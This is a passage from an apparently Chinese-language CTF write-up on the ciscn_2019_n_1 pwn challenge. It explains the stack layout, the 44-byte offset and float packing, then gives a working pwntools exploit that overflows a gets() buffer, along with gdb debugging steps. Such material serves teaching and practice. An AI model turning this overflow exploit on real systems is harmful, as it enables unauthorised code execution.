/flag&quot;</span><br><span class="line">0x4006c3 &lt;+77&gt;:  mov  eax, 0</span><br><span class="line">0x4006c8 &lt;+82&gt;:  call 0x400530 &lt;system@plt&gt;</span><br><span class="line">0x4006cd &lt;+87&gt;:  jmp  0x4006d9 &lt;func+99&gt;</span><br><span class="line">0x4006cf &lt;+89&gt;:  mov  edi, 0x4007d6          ; &quot;Its value should be 11.28125&quot;</span><br><span class="line">0x4006d4 &lt;+94&gt;:  call 0x400520 &lt;puts@plt&gt;</span><br><span class="line">0x4006d9 &lt;+99&gt;:  nop</span><br><span class="line">0x4006da &lt;+100&gt;: leave</span><br><span class="line">0x4006db &lt;+101&gt;: ret</span><br></pre></td></tr></table></figure>
+
+<p>把伪代码和汇编对应起来看，就能确认两件事：<code>v1</code> 储存在 <code>rbp-0x30</code> 处，<code>v2</code> 在 <code>rbp-0x4</code> 处。</p>
+<div class="note info flat"><p><strong>【汇编代码小 tips】Intel 语法和 AT&amp;T 语法</strong></p>
+<p>IDA 和 pwndbg 默认显示的是 <strong>Intel 语法</strong>：操作数<strong>前面是目的，后面是源</strong>，比如 <code>mov rbp, rsp</code> 是把 <code>rsp</code> 的值给 <code>rbp</code>。</p>
+<p>gdb 原生默认可能是 <strong>AT&amp;T 语法</strong>，顺序反过来，而且寄存器带 <code>%</code>、立即数带 <code>$</code>：<code>mov %rsp, %rbp</code>。看到这种写法不要慌，在 gdb 里执行：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure>
+
+<p>就能切回 Intel 语法。两种语法描述的是同一批指令，只是写法不同。</p>
+</div>
+
+<h3 id="v2-0-0-是怎么写的"><a href="#v2-0-0-是怎么写的" class="headerlink" title="v2 &#x3D; 0.0 是怎么写的"></a>v2 &#x3D; 0.0 是怎么写的</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pxor xmm0, xmm0</span><br><span class="line">movss DWORD PTR [rbp-0x4], xmm0</span><br></pre></td></tr></table></figure>
+
+<p><code>pxor xmm0, xmm0</code> 把 128 位的 <code>xmm0</code> 整个清零（任何数和自己异或都是 0），然后 <code>movss</code> 把 <code>xmm0</code> 的低 32 位写进 <code>[rbp-0x4]</code>，这就是 <code>v2 = 0.0</code>。</p>
+<p>注意这里是 <code>movss</code>（move scalar single，单精度 4 字节），不是 <code>movsd</code>（double，8 字节）。<strong><code>v2</code> 只占 4 个字节</strong>，这一点后面打包 payload 时非常关键。</p>
+<h3 id="gets-写到哪里"><a href="#gets-写到哪里" class="headerlink" title="gets 写到哪里"></a>gets 写到哪里</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea  rax, [rbp-0x30]</span><br><span class="line">mov  rdi, rax</span><br><span class="line">mov  eax, 0</span><br><span class="line">call gets@plt</span><br></pre></td></tr></table></figure>
+
+<p><code>lea rax, [rbp-0x30]</code> 把 <code>v1</code> 的地址算出来，<code>mov rdi, rax</code> 放进第一个参数寄存器。<code>mov eax, 0</code> 是因为 <code>gets</code> 是可变参数函数，SysV ABI 要求用 <code>al</code> 告诉它“这次传了几个向量寄存器参数”，这里没有，所以清零。</p>
+<p><code>gets</code> 不检查长度，从 <code>rbp-0x30</code> 开始一直往高地址写，<code>v2</code> 就在 <code>rbp-0x4</code>，正好是第 45 个字节开始的位置。</p>
+<h3 id="比较和分支"><a href="#比较和分支" class="headerlink" title="比较和分支"></a>比较和分支</h3><p><code>gets</code> 返回之后，编译器是这么比较的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">movss xmm0, DWORD PTR [rbp-0x4]     ; 读 v2</span><br><span class="line">ucomiss xmm0, DWORD PTR [rip+0x146] ; 和 0x4007f4 处的常量比较</span><br><span class="line">jp   0x4006cf                        ; 无序（NaN）就跳去 else</span><br><span class="line">...</span><br><span class="line">jne  0x4006cf                        ; 不相等也跳去 else</span><br></pre></td></tr></table></figure>
+
+<p>几条指令拆开看：</p>
+<table>
+<thead>
+<tr>
+<th>指令 &#x2F; 标志</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>movss</code></td>
+<td>把 4 字节浮点数读进 <code>xmm0</code> 的低 32 位</td>
+</tr>
+<tr>
+<td><code>ucomiss</code></td>
+<td>无符号比较两个单精度浮点数，结果放在标志位里</td>
+</tr>
+<tr>
+<td><code>jp</code></td>
+<td>Parity Flag 置位时跳转，也就是比较结果是“无序”（出现 NaN）</td>
+</tr>
+<tr>
+<td><code>jne</code></td>
+<td>ZF 为 0 时跳转，也就是两个数不相等</td>
+</tr>
+</tbody></table>
+<p>C 语言的 <code>==</code> 遇到 NaN 必须返回假，所以编译器先 <code>jp</code> 把 NaN 的情况挑出去，再 <code>jne</code> 判断是否相等。<code>-O0</code> 编译出来会有点啰嗦（读了两遍 <code>v2</code>、比较了两遍），不用纠结，只要知道<strong>判断的就是 <code>v2</code> 这 4 个字节</strong>就够了。</p>
+<p>比较用的常量在 <code>0x4007f4</code>，后面在 gdb 里可以直接看：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/fw 0x4007f4</span><br><span class="line">0x4007f4: 11.28125</span><br><span class="line">pwndbg&gt; x/wx 0x4007f4</span><br><span class="line">0x4007f4: 0x41348000</span><br></pre></td></tr></table></figure>
+
+<p><code>0x41348000</code> 就是 <code>11.28125</code> 在内存里的样子。记住这个值，它就是我们要写进 <code>v2</code> 的 4 个字节。</p>
+<h2 id="算偏移：44-是怎么来的"><a href="#算偏移：44-是怎么来的" class="headerlink" title="算偏移：44 是怎么来的"></a>算偏移：44 是怎么来的</h2><p>IDA 的注释已经把答案写在脸上了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_BYTE v1[<span class="number">44</span>];   <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line"><span class="type">float</span> v2;       <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br></pre></td></tr></table></figure>
+
+<p>两个 <code>rbp</code> 相对地址相减：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(rbp - 0x4) - (rbp - 0x30) = 0x2c = 44</span><br></pre></td></tr></table></figure>
+
+<p>画成栈图：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+--------------------------+</span><br><span class="line">|  func 的返回地址 (8)     |  &lt;- rbp + 8</span><br><span class="line">+--------------------------+</span><br><span class="line">|  保存的 rbp (8)          |  &lt;- rbp</span><br><span class="line">+--------------------------+</span><br><span class="line">|  v2 (4)                  |  &lt;- rbp - 0x4   目标！</span><br><span class="line">+--------------------------+</span><br><span class="line">|  v1[44]                  |  &lt;- rbp - 0x30  gets 从这里开始写</span><br><span class="line">+--------------------------+</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<p><code>gets</code> 从 <code>v1</code> 的起点 <code>rbp-0x30</code> 开始往高地址写：</p>
+<ul>
+<li>前 44 个字节填满 <code>v1</code>；</li>
+<li>第 45 个字节开始，写的就是 <code>v2</code>；</li>
+<li><code>v2</code> 只有 4 字节，所以再写 4 个字节就正好覆盖完它。</li>
+</ul>
+<p>偏移就是 <code>0x30 - 0x4 = 0x2c = 44</code>。</p>
+<h3 id="为什么不是-48"><a href="#为什么不是-48" class="headerlink" title="为什么不是 48"></a>为什么不是 48</h3><p><code>0x30</code>（48）是 <code>sub rsp, 0x30</code> 给整个局部变量区腾出的空间，<code>44 + 4 = 48</code> 正好用完。但 <code>v2</code> 是从第 44 个字节<strong>开始</strong>的，我们要的是 <code>v2</code> 的起始位置，不是整块空间的末尾。</p>
+<p>所以 exp 里的 <code>PADDING = 44</code>，payload 总长度是 <code>44 + 4 = 48</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 44 字节 A ][ 4 字节浮点 ]  = 48 字节</span><br></pre></td></tr></table></figure>
+
+<p>这两个数字容易混：</p>
+<table>
+<thead>
+<tr>
+<th>数字</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>44</code></td>
+<td>填充长度，从 <code>v1</code> 起点走到 <code>v2</code> 起点</td>
+</tr>
+<tr>
+<td><code>48</code></td>
+<td>payload 总长度，44 填充 + 4 字节浮点数</td>
+</tr>
+<tr>
+<td><code>0x2c</code></td>
+<td>44 的十六进制写法</td>
+</tr>
+<tr>
+<td><code>0x30</code></td>
+<td>整个局部变量区的大小，等于 44 + 4</td>
+</tr>
+</tbody></table>
+<div class="note info flat"><p>IDA 同时给出了 <code>[rsp+...]</code> 和 <code>[rbp-...]</code> 两套相对地址，这是因为函数执行过 <code>sub rsp, 0x30</code> 之后，<code>rsp</code> 和 <code>rbp</code> 的关系就固定了：<code>rsp = rbp - 0x30</code>。所以 <code>[rsp+0x2c]</code> 和 <code>[rbp-0x4]</code> 指的是同一个地方。看栈布局时认准 <code>rbp</code> 最直观。</p>
+</div>
+
+<h2 id="11-28125-在内存里长什么样"><a href="#11-28125-在内存里长什么样" class="headerlink" title="11.28125 在内存里长什么样"></a>11.28125 在内存里长什么样</h2><p>偏移算出来了，接下来要解决“怎么写一个浮点数”。<code>p64</code> 只能打包整数，浮点数得用 <code>struct</code>。</p>
+<h3 id="IEEE-754-单精度"><a href="#IEEE-754-单精度" class="headerlink" title="IEEE 754 单精度"></a>IEEE 754 单精度</h3><p>C 的 <code>float</code> 按 IEEE 754 单精度存储，一共 32 位：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 位符号 | 8 位指数 | 23 位尾数</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>11.28125</code> 拆开：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11.28125 = 11 + 0.28125</span><br><span class="line">         = 1011.01001₂</span><br><span class="line">         = 1.01101001₂ × 2³</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>符号位：正数，<code>0</code>；</li>
+<li>指数位：<code>3 + 127 = 130 = 10000010₂</code>（单精度的偏移量是 127）；</li>
+<li>尾数位：去掉整数部分的 <code>01101001</code>，后面补 0 到 23 位。</li>
+</ul>
+<p>拼起来：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 10000010 01101001000000000000000</span><br><span class="line">= 0100 0001 0011 0100 1000 0000 0000 0000</span><br><span class="line">= 0x41348000</span><br></pre></td></tr></table></figure>
+
+<p><code>0x41348000</code> 按小端序存进内存，字节顺序是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 80 34 41</span><br></pre></td></tr></table></figure>
+
+<p>最后那个 <code>0x41</code> 正好是字符 <code>A</code>，挺巧的，但不是重点。</p>
+<div class="note info flat"><p><strong>为什么 <code>11.28125</code> 能被精确表示？</strong></p>
+<p><code>0.28125 = 9/32</code>，是分母为 2 的幂的分数，转成二进制是有限的 <code>0.01001₂</code>，23 位尾数放得下，所以单精度能<strong>精确</strong>存下它，不存在舍入误差，<code>==</code> 比较才可靠。</p>
+<p>如果题目写的是 <code>11.1</code> 这种十进制有限、二进制无限循环的数，float 存进去就有误差，比较时只能近似。CTF 出题人特意挑 <code>11.28125</code>，就是为了让“精确相等”成立。</p>
+</div>
+
+<h3 id="用-struct-pack-打包"><a href="#用-struct-pack-打包" class="headerlink" title="用 struct.pack 打包"></a>用 struct.pack 打包</h3><p>Python 的 <code>struct</code> 模块可以直接按 C 的格式打包：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, <span class="number">11.28125</span>)</span><br><span class="line"><span class="string">b&#x27;\x00\x804A&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, <span class="number">11.28125</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;00803441&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>b&#39;\x00\x804A&#39;</code> 就是 4 个字节：<code>00 80 34 41</code>（<code>0x34</code> 是字符 <code>4</code>，<code>0x41</code> 是字符 <code>A</code>，所以打印出来长得像 <code>\x804A</code>）。</p>
+<p>想反查它对应的整数位模式：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, <span class="number">11.28125</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="string">&#x27;0x41348000&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>和 gdb 里 <code>x/wx 0x4007f4</code> 看到的一模一样。</p>
+<h3 id="为什么是"><a href="#为什么是" class="headerlink" title="为什么是 &lt;f，不是 &lt;d"></a>为什么是 <code>&lt;f</code>，不是 <code>&lt;d</code></h3><p>格式字符串里的每个字符都有含义：</p>
+<table>
+<thead>
+<tr>
+<th>部分</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;</code></td>
+<td>小端序（little-endian）</td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td>大端序（big-endian）</td>
+</tr>
+<tr>
+<td><code>f</code></td>
+<td>C 的 <code>float</code>，4 字节单精度</td>
+</tr>
+<tr>
+<td><code>d</code></td>
+<td>C 的 <code>double</code>，8 字节双精度</td>
+</tr>
+</tbody></table>
+<p>x86-64 是小端，所以用 <code>&lt;</code>。而 <code>f</code> 和 <code>d</code> 选错，后果很直接：</p>
+<ul>
+<li><code>struct.pack(&#39;&lt;f&#39;, 11.28125)</code> 得到 4 字节，正好覆盖 <code>v2</code>；</li>
+<li><code>struct.pack(&#39;&lt;d&#39;, 11.28125)</code> 得到 8 字节，会把 <code>v2</code> 后面<strong>保存的 rbp</strong> 也写掉；更糟的是，double 的低 4 字节是 <code>00 00 00 00</code>，<code>v2</code> 反而变成 <code>0.0</code>，<code>if</code> 直接走 else。</li>
+</ul>
+<p>所以这里必须用 <code>&lt;f</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>struct.pack(<span class="string">&#x27;&lt;d&#x27;</span>, <span class="number">11.28125</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;0000000000902640&#x27;</span>   <span class="comment"># 8 字节，前 4 个字节还是 0</span></span><br></pre></td></tr></table></figure>
+
+<div class="note warning flat"><p><strong>不要用 <code>p32(1128125)</code>。</strong> <code>p32</code> 打包的是整数 <code>1128125</code> 的二进制，不是浮点数的 IEEE 754 表示。想要 4 字节的 <code>11.28125</code>，要么 <code>struct.pack(&#39;&lt;f&#39;, 11.28125)</code>，要么直接 <code>p32(0x41348000)</code>——后者需要你先手算出位模式，前者更不容易错。</p>
+</div>
+
+<h2 id="写-exp"><a href="#写-exp" class="headerlink" title="写 exp"></a>写 exp</h2><p>现在开始准备 exp。思路很简单：44 个 <code>A</code> 填满 <code>v1</code>，后面接 4 字节的浮点数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">PADDING = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">FLOAT = <span class="number">11.28125</span></span><br><span class="line">io = remote(HOST, PORT, ssl=<span class="literal">True</span>, sni=HOST)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * PADDING</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, FLOAT)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Sending Payload (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>bytes)&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>逐行拆开看：</p>
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>from pwn import *</code></td>
+<td>导入 pwntools，<code>remote</code>、<code>log</code>、<code>context</code> 都在里面</td>
+</tr>
+<tr>
+<td><code>import struct</code></td>
+<td>打包浮点数要用到，pwntools 不提供这个功能</td>
+</tr>
+<tr>
+<td><code>context.log_level = &#39;info&#39;</code></td>
+<td>让 pwntools 打印连接、发送等日志</td>
+</tr>
+<tr>
+<td><code>HOST</code> &#x2F; <code>PORT</code></td>
+<td>靶机地址和端口，按平台给的填</td>
+</tr>
+<tr>
+<td><code>PADDING = 44</code></td>
+<td>从 <code>v1</code> 起点走到 <code>v2</code> 起点</td>
+</tr>
+<tr>
+<td><code>FLOAT = 11.28125</code></td>
+<td>题目要求的值</td>
+</tr>
+<tr>
+<td><code>remote(HOST, PORT, ssl=True, sni=HOST)</code></td>
+<td>连接靶机；走 TLS 的平台要加 <code>ssl</code> 和 <code>sni</code></td>
+</tr>
+<tr>
+<td><code>b&#39;A&#39; * PADDING</code></td>
+<td>44 个垃圾字节，填满 <code>v1</code></td>
+</tr>
+<tr>
+<td><code>struct.pack(&#39;&lt;f&#39;, FLOAT)</code></td>
+<td>把浮点数打包成 4 字节小端</td>
+</tr>
+<tr>
+<td><code>sendline(payload)</code></td>
+<td>发送 payload 并补一个换行，<code>gets</code> 读到换行就停</td>
+</tr>
+<tr>
+<td><code>interactive()</code></td>
+<td>把终端交给靶机，方便看输出</td>
+</tr>
+</tbody></table>
+<p>这里添加浮点数的方式是 <code>struct</code> 库里的 <code>pack</code> 方法，所以需要 <code>import struct</code>。<code>&#39;&lt;f&#39;</code> 指的是<strong>小端 + 单精度 float</strong>，和 x86-64 的内存布局对应。</p>
+<p>payload 一共 <code>44 + 4 = 48</code> 字节。</p>
+<p>如果你本地想先跑一下，把 <code>remote(...)</code> 换成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="你怎么知道-payload-真的按想法走了"><a href="#你怎么知道-payload-真的按想法走了" class="headerlink" title="你怎么知道 payload 真的按想法走了"></a>你怎么知道 payload 真的按想法走了</h2><p>你现在拿到 payload 了，但是你怎么知道它是不是真的按你的想法走的呢？</p>
+<p><strong>能打通，不代表你理解对了。</strong> 有时候 payload 碰巧能拿 flag，有时候失败了你也不知道错在偏移还是字节序。最稳的办法是：在本地用 gdb 把 payload 送进去，停在 <code>gets</code> 之后，亲眼看 <code>v2</code> 有没有变成 <code>11.28125</code>。</p>
+<p>这一节介绍怎么用 pwntools 进行 gdb 调试。</p>
+<h3 id="先配终端"><a href="#先配终端" class="headerlink" title="先配终端"></a>先配终端</h3><p><code>gdb.debug</code> 会<strong>另开一个终端窗口</strong>运行 gdb，所以要先告诉 pwntools 用什么命令开终端。最常用的是 tmux：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;new-window&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>这行要求你当前的 shell 已经在 tmux 会话里。先执行 <code>tmux</code> 进入会话，再运行 exp，就会弹出一个新窗口给你调 gdb。</p>
+<p>如果不用 tmux，也可以换成别的终端：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GNOME 桌面</span></span><br><span class="line">context.terminal = [<span class="string">&quot;gnome-terminal&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># 或者 xterm</span></span><br><span class="line">context.terminal = [<span class="string">&quot;xterm&quot;</span>, <span class="string">&quot;-e&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># tmux 水平分屏，左边跑 exp 右边调 gdb</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>哪种都行，能弹出一个能敲 gdb 命令的窗口就可以。</p>
+<h3 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb.debug"></a>gdb.debug</h3><p>开启 gdb 调试的方法很简单：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io = gdb.debug(<span class="string">&#x27;./pwn3&#x27;</span>, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *main</span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>前面是你要运行的文件，后面是 gdb 里要执行的命令。<code>gdbscript</code> 会在 gdb 启动后自动执行，<strong>注意要打断点</strong>：</p>
+<ul>
+<li><code>b *main</code>：在 <code>main</code> 入口下断点；</li>
+<li><code>continue</code>：运行到断点停下来。</li>
+</ul>
+<p>如果不打断点，程序会直接跑起来等你输入，你虽然还能交互，但没有机会在中间暂停、看寄存器。打断点的目的是“先把它摁住，再慢慢看”。</p>
+<p>完整的调试版 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;new-window&quot;</span>]</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;752e0d41683080aa9389cc2c.tcp-ctf2.dasctf.com&#x27;</span></span><br><span class="line">PORT = <span class="number">9999</span></span><br><span class="line">PADDING = <span class="number">44</span></span><br><span class="line"></span><br><span class="line">FLOAT = <span class="number">11.28125</span></span><br><span class="line"></span><br><span class="line">io = gdb.debug(<span class="string">&#x27;./pwn3&#x27;</span>, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *main</span></span><br><span class="line"><span class="string">    continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(HOST, PORT, ssl=True, sni=HOST)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * PADDING</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, FLOAT)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">f&quot;Sending Payload (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>bytes)&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>跑起来之后，gdb 窗口会停在 <code>main</code>：</p>
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-6.png" alt="停在 main"></p>
+<p><em>图 6：gdb 停在 <code>main</code>，此时还没进入 <code>func</code>，payload 也还没被读走</em></p>
+<p>运行后成功进来了，此时还没到 <code>func</code>，所以 payload 还没进来。<strong>注意 <code>sendline</code> 只是把数据写进连接的缓冲区，真正读取它的是 <code>gets</code>。</strong> 现在程序被断点摁在 <code>main</code>，还没走到那里。</p>
+<h3 id="单步到-gets-之后"><a href="#单步到-gets-之后" class="headerlink" title="单步到 gets 之后"></a>单步到 gets 之后</h3><p>接下来打 <code>func</code> 的断点，然后 <code>c</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b func</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-7.png" alt="停在 func"></p>
+<p><em>图 7：停在 <code>func</code> 里，<code>rsp</code> 已经减了 <code>0x30</code></em></p>
+<p>程序停在 <code>func</code> 的入口附近。接下来用 <code>ni</code>（nexti）一条一条往下走。<code>ni</code> 和 <code>si</code> 的区别：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>简写</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>nexti</code></td>
+<td><code>ni</code></td>
+<td>执行一条指令，<strong>遇到 <code>call</code> 不进去</strong>，直接执行到返回</td>
+</tr>
+<tr>
+<td><code>stepi</code></td>
+<td><code>si</code></td>
+<td>执行一条指令，<strong>遇到 <code>call</code> 跟进去</strong></td>
+</tr>
+</tbody></table>
+<p>我们要的是“让 <code>gets</code> 执行完，然后停在它后面”，所以用 <code>ni</code>。一直 <code>ni</code> 到 <code>call gets@plt</code> 这一行：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x40069d &lt;+39&gt;: call 0x400550 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这里再按一次 <code>ni</code>，<code>gets</code> 会去读输入。payload 已经由 exp 里的 <code>sendline</code> 写进连接的缓冲区，所以 gdb 不会卡住；<code>gets</code> 返回后，gdb 停在下一行 <code>0x4006a2</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x4006a2 &lt;+44&gt;: movss xmm0, DWORD PTR [rbp-0x4]</span><br></pre></td></tr></table></figure>
+
+<p>再按一次 <code>ni</code>，让这条 <code>movss</code> 执行完，<code>xmm0</code> 里就是 <code>v2</code> 的值，此时停在 <code>0x4006a7</code>。</p>
+<h3 id="看-xmm0"><a href="#看-xmm0" class="headerlink" title="看 xmm0"></a>看 xmm0</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p $xmm0.v4_float[0]</span><br><span class="line">$1 = 11.28125</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/11/06/pwn-ctf-ciscn-2019-n-1/image-8.png" alt="xmm0 里是 11.28125"></p>
+<p><em>图 8：<code>v2</code> 已经被改写成 11.28125</em></p>
+<p><code>xmm0</code> 是 128 位的 SSE 寄存器，gdb 可以把它按不同的“视角”解释：</p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>含义</th>
+</tr>
